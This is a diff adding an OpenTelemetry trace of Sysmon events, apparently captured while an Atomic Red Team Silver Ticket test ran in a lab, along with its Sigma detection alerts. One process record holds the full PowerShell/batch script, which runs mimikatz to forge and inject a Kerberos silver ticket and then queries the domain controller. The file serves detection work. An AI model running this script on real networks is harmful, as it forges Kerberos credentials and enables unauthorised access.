@@ -1,0 +1,364 @@
+﻿{
+    "traceID":  "6c5a71079a630f3364f2e377d56583cf",
+    "spans":  [
+                  {
+                      "traceID":  "6c5a71079a630f3364f2e377d56583cf",
+                      "spanID":  "b7e5854286592134",
+                      "operationName":  "powershell.exe@evt:1",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "6c5a71079a630f3364f2e377d56583cf",
+                                             "spanID":  "15737ce9ca73fb6c"
+                                         }
+                                     ],
+                      "startTime":  1758810295478390,
+                      "duration":  27178,
+                      "tags":  [
+                                   {
+                                       "key":  "CommandLine",
+                                       "type":  "string",
+                                       "value":  "\"powershell.exe\" \u0026 {Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \\\"\"S-1-5-21-DEFAULT\\\"\"\nIf ($domain_sid -Match \\\"\"DEFAULT\\\"\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf(\u0027-\u0027))\n}\n\n# create batch file with commands to run in a separate \\\"\"runas /netonly\\\"\" session\n# so we don\u0027t purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \\\"\"runas /netonly\\\"\" output otherwise\n@\\\"\"\n\u003e%%TEMP%%\\silver.txt 2\u003e\u00261 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \\\"\"kerberos::golden /domain:%%userdnsdomain%% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%%logonserver:\\\\=%%.%%userdnsdomain%% /ptt\\\"\" \\\"\"exit\\\"\"\n\n  echo.\n  echo executing:schtasks /query /S %%logonserver:\\\\=%%.%%userdnsdomain%%\n  schtasks /query /S %%logonserver:\\\\=%%.%%userdnsdomain%%\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\\\"\"@ -Replace \\\"\"DOMAIN_SID\\\"\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \\\"\"foo\\\"\" | runas /netonly /user:fake \\\"\"$env:TEMP\\silver.bat\\\"\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \\\"\"$env:TEMP\\silver.txt\\\"\" -Wait | ForEach-Object {\n    if ($_ -match \u0027End of Silver Ticket attack\u0027) { break } \n  }\n} while ($false) # dummy loop so that \u0027break\u0027 can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore}"
+                                   },
+                                   {
+                                       "key":  "Company",
+                                       "type":  "string",
+                                       "value":  "Microsoft Corporation"
+                                   },
+                                   {
+                                       "key":  "CurrentDirectory",
+                                       "type":  "string",
+                                       "value":  "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\"
+                                   },
+                                   {
+                                       "key":  "Description",
+                                       "type":  "string",
+                                       "value":  "Windows PowerShell"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "ProcessCreate(rule:ProcessCreate)"
+                                   },
+                                   {
+                                       "key":  "FileVersion",
+                                       "type":  "string",
+                                       "value":  "10.0.20348.1 (WinBuild.160101.0800)"
+                                   },
+                                   {
+                                       "key":  "Hashes",
+                                       "type":  "string",
+                                       "value":  "MD5=2E0CCB27064856E3D55017FA2D33A7B9,SHA256=1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                                   },
+                                   {
+                                       "key":  "IntegrityLevel",
+                                       "type":  "string",
+                                       "value":  "High"
+                                   },
+                                   {
+                                       "key":  "LogonGuid",
+                                       "type":  "string",
+                                       "value":  "5847f778-4539-68d5-373f-040000000000"
+                                   },
+                                   {
+                                       "key":  "LogonId",
+                                       "type":  "int64",
+                                       "value":  278327
+                                   },
+                                   {
+                                       "key":  "OriginalFileName",
+                                       "type":  "string",
+                                       "value":  "PowerShell.EXE"
+                                   },
+                                   {
+                                       "key":  "ParentCommandLine",
+                                       "type":  "string",
+                                       "value":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy Bypass -Command \"Import-Module \\\"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\\\" -Force; Invoke-AtomicTest T1558.002\" "
+                                   },
+                                   {
+                                       "key":  "ParentImage",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                                   },
+                                   {
+                                       "key":  "ParentProcessGuid",
+                                       "type":  "string",
+                                       "value":  "5847f778-5097-68d5-4905-000000000500"
+                                   },
+                                   {
+                                       "key":  "ParentProcessId",
+                                       "type":  "int64",
+                                       "value":  5180
+                                   },
+                                   {
+                                       "key":  "ParentUser",
+                                       "type":  "string",
+                                       "value":  "WIN-KH0QS2E5QMD\\Administrator"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "5847f778-50b6-68d5-9405-000000000500"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  4776
+                                   },
+                                   {
+                                       "key":  "Product",
+                                       "type":  "string",
+                                       "value":  "MicrosoftÂ® WindowsÂ® Operating System"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TerminalSessionId",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 07:24:54"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-KH0QS2E5QMD\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 14:24:54.507"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "error",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "otel.status_code",
+                                       "type":  "string",
+                                       "value":  "ERROR"
+                                   },
+                                   {
+                                       "key":  "otel.status_description",
+                                       "type":  "string",
+                                       "value":  "Sigma rules matched: 2"
+                                   },
+                                   {
+                                       "key":  "sigma.alert",
+                                       "type":  "string",
+                                       "value":  "[\"a642964e-bead-4bed-8910-1bb4d63e3b4d\",\"f4bbd493-b796-416e-bbf2-121235348529\"]"
+                                   },
+                                   {
+                                       "key":  "sigma.match_count",
+                                       "type":  "int64",
+                                       "value":  2
+                                   },
+                                   {
+                                       "key":  "sigma.rule_title",
+                                       "type":  "string",
+                                       "value":  "[\"HackTool - Mimikatz Execution\",\"Non Interactive PowerShell Process Spawned\"]"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5180
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=15737ce9ca73fb6c; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "6c5a71079a630f3364f2e377d56583cf",
+                      "spanID":  "5e44c891da5960ef",
+                      "operationName":  "powershell.exe@evt:11",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "6c5a71079a630f3364f2e377d56583cf",
+                                             "spanID":  "15737ce9ca73fb6c"
+                                         }
+                                     ],
+                      "startTime":  1758810295509285,
+                      "duration":  27743,
+                      "tags":  [
+                                   {
+                                       "key":  "CreationUtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 14:24:54.724"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Filecreated(rule:FileCreate)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  11
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "5847f778-50b6-68d5-9405-000000000500"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  4776
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TargetFilename",
+                                       "type":  "string",
+                                       "value":  "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_s45q5f2n.cxi.ps1"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 07:24:54"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-KH0QS2E5QMD\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 14:24:54.724"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5180
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=15737ce9ca73fb6c; skipping clock skew adjustment"
+                                   ]
+                  }
+              ],
+    "processes":  {
+                      "p1":  {
+                                 "serviceName":  "event-agent",
+                                 "tags":  [
+                                              {
+                                                  "key":  "service.instance.id",
+                                                  "type":  "string",
+                                                  "value":  "610afb0d-5f2e-4067-ab7e-55f3ff76c692"
+                                              },
+                                              {
+                                                  "key":  "telemetry.sdk.language",
+                                                  "type":  "string",
+                                                  "value":  "dotnet"
+                                              },
+                                              {
+                                                  "key":  "telemetry.sdk.name",
+                                                  "type":  "string",
+                                                  "value":  "opentelemetry"
+                                              },
+                                              {
+                                                  "key":  "telemetry.sdk.version",
+                                                  "type":  "string",
+                                                  "value":  "1.12.0"
+                                              }
+                                          ]
+                             }
+                  },
+    "warnings":  null
+}
